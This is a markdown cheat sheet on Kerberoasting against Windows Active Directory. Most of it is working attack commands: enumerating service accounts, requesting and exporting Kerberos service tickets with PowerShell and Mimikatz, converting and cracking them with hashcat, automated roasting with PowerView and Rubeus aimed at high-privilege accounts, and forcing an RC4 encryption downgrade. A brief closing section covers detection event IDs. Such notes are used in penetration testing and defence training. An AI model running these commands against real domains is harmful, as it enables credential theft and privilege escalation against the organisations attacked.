# Kerberoasting — Windows

---

## Semi-Manual (setspn + Mimikatz)

Enumerate SPNs — ignore computer accounts, focus on user accounts:

```cmd
setspn.exe -Q */*
```

Request TGS for a specific SPN into memory:

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN_STRING>"
```

Extract from memory with Mimikatz — base64 out for portability:

```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

Convert base64 blob to .kirbi, then crack:

```bash
echo "<base64>" | tr -d \\n | base64 -d > <USER>.kirbi
python2.7 kirbi2john.py <USER>.kirbi > crack_file
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > <USER>_hashcat
hashcat -m 13100 <USER>_hashcat <WORDLIST>
```

> [!tip] Skip base64 by omitting `base64 /out:true` — Mimikatz writes `.kirbi` files to disk. Transfer and run `kirbi2john.py` directly.

---

## PowerView (Automated)

List SPN accounts:

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

Get ticket for specific user in Hashcat format:

```powershell
Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
```

Export all tickets to CSV — feed hashes to Hashcat offline:

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\<OUTFILE>.csv -NoTypeInformation
```

---

## Rubeus (Fastest)

Stats first — check encryption types and how many are RC4 vs AES:

```powershell
.\Rubeus.exe kerberoast /stats
```

Roast only `admincount=1` accounts — highest value targets, ready for Hashcat:

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

Target specific user:

```powershell
.\Rubeus.exe kerberoast /user:<USER> /nowrap
```

All tickets to file:

```powershell
.\Rubeus.exe kerberoast /outfile:<OUTFILE>.txt
```

---

## Encryption Types & Downgrade

`msDS-SupportedEncryptionTypes=0` → RC4 default (`$krb5tgs$23$`) → hashcat mode 13100, cracks fast.

`msDS-SupportedEncryptionTypes=24` → AES-128/256 only (`$krb5tgs$18$`) → hashcat mode 19700, significantly slower.

Check what a target account supports:

```powershell
Get-DomainUser <USER> -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

Force RC4 downgrade on AES accounts using `/tgtdeleg`:

```powershell
.\Rubeus.exe kerberoast /user:<USER> /tgtdeleg /nowrap
```

> [!warning] `/tgtdeleg` downgrade does **not** work against Windows Server 2019 DCs — will always return AES-256 regardless of domain functional level. On 2016 and earlier it works even if AES is enabled on the account.

---

## Detection

Event ID 4769 (TGS ticket requested) — bulk requests from one account in a short window = spray. Encryption type `0x17` (RC4) in 4769 events is the key indicator — AES-enabled environments shouldn't be generating RC4 TGS requests. Event ID 4770 = ticket renewed.